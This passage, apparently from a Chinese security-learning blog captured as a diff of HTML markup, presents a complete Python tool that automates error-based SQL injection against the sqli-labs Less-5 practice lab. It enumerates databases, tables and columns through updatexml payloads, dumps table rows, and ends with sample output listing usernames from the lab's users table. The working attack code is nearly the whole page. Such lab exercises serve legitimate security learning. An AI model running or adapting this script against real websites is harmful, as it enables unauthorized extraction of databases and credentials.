+        self<span class="token punctuation">.</span>columns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 存储列名</span>
+        self<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 存储查询到的数据</span>
+        self<span class="token punctuation">.</span>pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'error: \'~(.*?)~\''</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>  <span class="token comment"># 正则表达式子从错误数据中提取数据</span>
+        self<span class="token punctuation">.</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'</span>
+        <span class="token punctuation">&#125;</span>  <span class="token comment"># 伪造HTTP请求头设置</span>
+        self<span class="token punctuation">.</span>base_url <span class="token operator">=</span> <span class="token string">"http://sql/sqli-labs/Less-5/?id=1 '"</span>
+        self<span class="token punctuation">.</span>current_user <span class="token operator">=</span> <span class="token boolean">None</span>  <span class="token comment"># 存储当前的数据库信息</span>
+
+    <span class="token keyword">def</span> <span class="token function">send_payload</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># self表示该方法属于类实例，可以访问类属性和其他方法</span>
+        <span class="token triple-quoted-string string">"""发送payload并返回响应"""</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>base_url<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
+            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>self<span class="token punctuation">.</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>  <span class="token comment"># 设置10秒等待，避免无限等待</span>
+            response<span class="token punctuation">.</span>raise_for_status<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 响应的状态的检测，确保只处理成功的响应</span>
+            <span class="token keyword">return</span> response<span class="token punctuation">.</span>text
+        <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>RequestException <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[!] 请求失败: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> <span class="token boolean">None</span>
+
+    <span class="token keyword">def</span> <span class="token function">extract_data</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> html<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># html，网页HTML的内容</span>
+        <span class="token triple-quoted-string string">"""从错误信息中提取数据"""</span>
+        <span class="token keyword">if</span> <span class="token keyword">not</span> html<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+        <span class="token keyword">return</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>self<span class="token punctuation">.</span>pattern<span class="token punctuation">,</span> html<span class="token punctuation">)</span>  <span class="token comment"># self.pattern 返回所有非重叠匹配的列表</span>
+
+    <span class="token keyword">def</span> <span class="token function">get_database_count</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment"># 获取数据库的数量</span>
+        payload <span class="token operator">=</span> <span class="token string">" or updatexml(0,concat(0x7e,(select count(schema_name) from information_schema.schemata),0x7e),1)--+"</span>
+        html <span class="token operator">=</span> self<span class="token punctuation">.</span>send_payload<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 调用类中的 send_payload 方法发送构造的注入语句，返回服务器响应的HTML的内容</span>
+        result <span class="token operator">=</span> self<span class="token punctuation">.</span>extract_data<span class="token punctuation">(</span>html<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">if</span> result <span class="token keyword">else</span> <span class="token number">0</span>  <span class="token comment"># 如果resul存在的话将result数组第一个字符转化为整形，result不存在的话返回0</span>
+
+    <span class="token keyword">def</span> <span class="token function">get_databases</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment"># 获取所有非系统数据库名</span>
+        count <span class="token operator">=</span> self<span class="token punctuation">.</span>get_database_count<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] 发现 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>count<span class="token punctuation">&#125;</span></span><span class="token string"> 个数据库"</span></span><span class="token punctuation">)</span>
+
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f" or updatexml(0,concat(0x7e,(select schema_name from information_schema.schemata limit </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1),0x7e),1)--+"</span></span>
+            html <span class="token operator">=</span> self<span class="token punctuation">.</span>send_payload<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+            db_names <span class="token operator">=</span> self<span class="token punctuation">.</span>extract_data<span class="token punctuation">(</span>html<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> db_names<span class="token punctuation">:</span>
+                self<span class="token punctuation">.</span>databases<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>db_names<span class="token punctuation">)</span>  <span class="token comment"># 将提取到底的数据库名添加到self.databases的表中</span>
+
+        <span class="token comment"># 过滤常见系统数据库</span>
+        system_dbs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'information_schema'</span><span class="token punctuation">,</span> <span class="token string">'mysql'</span><span class="token punctuation">,</span> <span class="token string">'performance_schema'</span><span class="token punctuation">,</span> <span class="token string">'sys'</span><span class="token punctuation">]</span>
+        self<span class="token punctuation">.</span>databases <span class="token operator">=</span> <span class="token punctuation">[</span>db <span class="token keyword">for</span> db <span class="token keyword">in</span> self<span class="token punctuation">.</span>databases <span class="token keyword">if</span> db <span class="token keyword">not</span> <span class="token keyword">in</span> system_dbs<span class="token punctuation">]</span>
+        <span class="token comment"># for db in self.databases，遍历 self.databases 列表中的每一个元素（即数据库名），临时变量 db 表示当前遍历的数据库名，保留满足条件的db名</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 可用数据库列表:"</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>databases<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> self<span class="token punctuation">.</span>databases
+
+    <span class="token keyword">def</span> <span class="token function">get_table_count</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> database<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment"># 获取指定数据库的表的数量</span>
+        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f" or updatexml(0,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>database<span class="token punctuation">&#125;</span></span><span class="token string">'),0x7e),1)--+"</span></span>
+        html <span class="token operator">=</span> self<span class="token punctuation">.</span>send_payload<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+        result <span class="token operator">=</span> self<span class="token punctuation">.</span>extract_data<span class="token punctuation">(</span>html<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">if</span> result <span class="token keyword">else</span> <span class="token number">0</span>
+
+    <span class="token keyword">def</span> <span class="token function">get_tables</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> database<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment"># 获取指定数据库的所有表名</span>
+        count <span class="token operator">=</span> self<span class="token punctuation">.</span>get_table_count<span class="token punctuation">(</span>database<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] 数据库 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>database<span class="token punctuation">&#125;</span></span><span class="token string"> 有 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>count<span class="token punctuation">&#125;</span></span><span class="token string"> 个表"</span></span><span class="token punctuation">)</span>
+
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f" or updatexml(0,concat(0x7e,(select table_name from information_schema.tables where table_schema='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>database<span class="token punctuation">&#125;</span></span><span class="token string">' limit </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1),0x7e),1)--+"</span></span>
+            html <span class="token operator">=</span> self<span class="token punctuation">.</span>send_payload<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+            table_names <span class="token operator">=</span> self<span class="token punctuation">.</span>extract_data<span class="token punctuation">(</span>html<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> table_names<span class="token punctuation">:</span>
+                self<span class="token punctuation">.</span>tables<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>table_names<span class="token punctuation">)</span>
+
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 数据库 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>database<span class="token punctuation">&#125;</span></span><span class="token string"> 的表列表:"</span></span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>tables<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> self<span class="token punctuation">.</span>tables
+
+    <span class="token keyword">def</span> <span class="token function">get_column_count</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> table<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment"># 获取指定表的列数量</span>
+        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f" or updatexml(0,concat(0x7e,(select count(column_name) from information_schema.columns where table_name='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string">'),0x7e),1)--+"</span></span>
+        html <span class="token operator">=</span> self<span class="token punctuation">.</span>send_payload<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+        result <span class="token operator">=</span> self<span class="token punctuation">.</span>extract_data<span class="token punctuation">(</span>html<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">if</span> result <span class="token keyword">else</span> <span class="token number">0</span>
+
+    <span class="token keyword">def</span> <span class="token function">get_columns</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> table<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment"># 获取指定表的所有列名</span>
+        count <span class="token operator">=</span> self<span class="token punctuation">.</span>get_column_count<span class="token punctuation">(</span>table<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] 表 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string"> 有 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>count<span class="token punctuation">&#125;</span></span><span class="token string"> 个列"</span></span><span class="token punctuation">)</span>
+
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f" or updatexml(0,concat(0x7e,(select column_name from information_schema.columns where table_name='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string">' limit </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1),0x7e),1)--+"</span></span>
+            html <span class="token operator">=</span> self<span class="token punctuation">.</span>send_payload<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+            column_names <span class="token operator">=</span> self<span class="token punctuation">.</span>extract_data<span class="token punctuation">(</span>html<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> column_names<span class="token punctuation">:</span>
+                self<span class="token punctuation">.</span>columns<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>column_names<span class="token punctuation">)</span>
+
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 表 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string"> 的列列表:"</span></span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>columns<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> self<span class="token punctuation">.</span>columns
+
+    <span class="token keyword">def</span> <span class="token function">get_data_count</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> table<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment"># 获取指定表的数据的行数</span>
+        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f" or updatexml(0,concat(0x7e,(select count(*) from `</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string">`),0x7e),1)--+"</span></span>
+        html <span class="token operator">=</span> self<span class="token punctuation">.</span>send_payload<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+        result <span class="token operator">=</span> self<span class="token punctuation">.</span>extract_data<span class="token punctuation">(</span>html<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">if</span> result <span class="token keyword">else</span> <span class="token number">0</span>
+
+    <span class="token keyword">def</span> <span class="token function">get_data</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> table<span class="token punctuation">,</span> columns<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment"># 获取指定表的数据</span>
+        count <span class="token operator">=</span> self<span class="token punctuation">.</span>get_data_count<span class="token punctuation">(</span>table<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> count <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[!] 表 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string"> 中没有数据或无法访问"</span></span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] 表 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string"> 有 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>count<span class="token punctuation">&#125;</span></span><span class="token string"> 行数据"</span></span><span class="token punctuation">)</span>
+
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token comment"># 获取多列数据，用~分隔</span>
+            cols <span class="token operator">=</span> <span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"`</span><span class="token interpolation"><span class="token punctuation">&#123;</span>col<span class="token punctuation">&#125;</span></span><span class="token string">`"</span></span> <span class="token keyword">for</span> col <span class="token keyword">in</span> columns<span class="token punctuation">]</span><span class="token punctuation">)</span>
+            payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f" or updatexml(0,concat(0x7e,(select concat_ws(0x7e,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>cols<span class="token punctuation">&#125;</span></span><span class="token string">) from `</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string">` limit </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1),0x7e),1)--+"</span></span>
+            html <span class="token operator">=</span> self<span class="token punctuation">.</span>send_payload<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+            row_data <span class="token operator">=</span> self<span class="token punctuation">.</span>extract_data<span class="token punctuation">(</span>html<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> row_data<span class="token punctuation">:</span>
+                self<span class="token punctuation">.</span>data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>row_data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'~'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+        <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>data<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[!] 获取数据失败，可能是权限不足或表结构特殊"</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 表 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string"> 的数据:"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">for</span> row <span class="token keyword">in</span> self<span class="token punctuation">.</span>data<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">" | "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>row<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+        <span class="token keyword">return</span> self<span class="token punctuation">.</span>data
+
+<span class="token keyword">def</span> <span class="token function">interactive_select</span><span class="token punctuation">(</span>options<span class="token punctuation">,</span> prompt<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#options: 一个列表，包含所有可供选择的选项，prompt: 字符串，显示给用户的提示信息</span>
+    <span class="token triple-quoted-string string">"""交互式选择菜单"""</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span> <span class="token operator">+</span> prompt<span class="token punctuation">)</span>
+    <span class="token keyword">for</span> i<span class="token punctuation">,</span> opt <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>options<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#格式化每个选项，使标号123与选项123对应</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">. </span><span class="token interpolation"><span class="token punctuation">&#123;</span>opt<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            choice <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请选择(1-&#123;&#125;): "</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token number">1</span> <span class="token operator">&lt;=</span> choice <span class="token operator">&lt;=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">return</span> options<span class="token punctuation">[</span>choice <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"输入无效，请重新选择"</span><span class="token punctuation">)</span>
+        <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"请输入数字"</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    explorer <span class="token operator">=</span> SQLiExplorer<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># 1. 获取所有数据库</span>
+    explorer<span class="token punctuation">.</span>get_databases<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> <span class="token keyword">not</span> explorer<span class="token punctuation">.</span>databases<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] 未发现可用数据库"</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span>
+
+    <span class="token comment"># 交互式选择数据库</span>
+    target_db <span class="token operator">=</span> interactive_select<span class="token punctuation">(</span>explorer<span class="token punctuation">.</span>databases<span class="token punctuation">,</span> <span class="token string">"请选择要查询的数据库:"</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># 2. 获取选定数据库的所有表</span>
+    explorer<span class="token punctuation">.</span>get_tables<span class="token punctuation">(</span>target_db<span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> <span class="token keyword">not</span> explorer<span class="token punctuation">.</span>tables<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] 数据库 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_db<span class="token punctuation">&#125;</span></span><span class="token string"> 中没有表"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span>
+
+    <span class="token comment"># 交互式选择表</span>
+    target_table <span class="token operator">=</span> interactive_select<span class="token punctuation">(</span>explorer<span class="token punctuation">.</span>tables<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"请选择要查询的表(数据库: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_db<span class="token punctuation">&#125;</span></span><span class="token string">):"</span></span><span class="token punctuation">)</span>
+
+    <span class="token comment"># 3. 获取选定表的所有列</span>
+    explorer<span class="token punctuation">.</span>get_columns<span class="token punctuation">(</span>target_table<span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> <span class="token keyword">not</span> explorer<span class="token punctuation">.</span>columns<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] 表 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_table<span class="token punctuation">&#125;</span></span><span class="token string"> 中没有列"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span>
+
+    <span class="token comment"># 选择要查询的列(多选)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n请选择要查询的列(可多选，输入逗号分隔的数字如1,2,3):"</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> i<span class="token punctuation">,</span> col <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>explorer<span class="token punctuation">.</span>columns<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">. </span><span class="token interpolation"><span class="token punctuation">&#123;</span>col<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+    selected <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"选择列: "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>
+    selected_columns <span class="token operator">=</span> <span class="token punctuation">[</span>explorer<span class="token punctuation">.</span>columns<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> selected <span class="token keyword">if</span> i<span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+
+    <span class="token keyword">if</span> <span class="token keyword">not</span> selected_columns<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] 未选择有效列，默认查询前两列"</span><span class="token punctuation">)</span>
+        selected_columns <span class="token operator">=</span> explorer<span class="token punctuation">.</span>columns<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>
+
+    <span class="token comment"># 4. 获取表数据</span>
+    explorer<span class="token punctuation">.</span>get_data<span class="token punctuation">(</span>target_table<span class="token punctuation">,</span> selected_columns<span class="token punctuation">)</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>运行结果：</p>
-<p>&lt;!–code￼6–&gt;
+<pre class="line-numbers language-none"><code class="language-none">[*] 发现 9 个数据库
+[+] 可用数据库列表: [&#39;cc&#39;, &#39;challenges&#39;, &#39;cvcv&#39;, &#39;security&#39;, &#39;sqlii&#39;]
+
+请选择要查询的数据库:
+1. cc
+2. challenges
+3. cvcv
+4. security
+5. sqlii
+请选择(1-5): 4
+[*] 数据库 security 有 4 个表
+[+] 数据库 security 的表列表: [&#39;emails&#39;, &#39;referers&#39;, &#39;uagents&#39;, &#39;users&#39;]
+
+请选择要查询的表(数据库: security):
+1. emails
+2. referers
+3. uagents
+4. users
+请选择(1-4): 4
+[*] 表 users 有 11 个列
+[+] 表 users 的列列表: [&#39;id&#39;, &#39;name&#39;, &#39;username&#39;, &#39;password&#39;, &#39;type&#39;, &#39;USER&#39;, &#39;CURRENT_CONNECTIONS&#39;, &#39;TOTAL_CONNECTIONS&#39;, &#39;id&#39;, &#39;username&#39;, &#39;password&#39;]
+
+请选择要查询的列(可多选，输入逗号分隔的数字如1,2,3):
+1. id
+2. name
+3. username
+4. password
+5. type
+6. USER
+7. CURRENT_CONNECTIONS
+8. TOTAL_CONNECTIONS
+9. id
+10. username
+11. password
+选择列: 3
+[*] 表 users 有 13 行数据
+[+] 表 users 的数据:
+Dumb
+Angelina
+Dummy
+secure
+stupid
+superman
+batman
+admin
+admin1
+admin2
+admin3
+dhakkan
+admin4
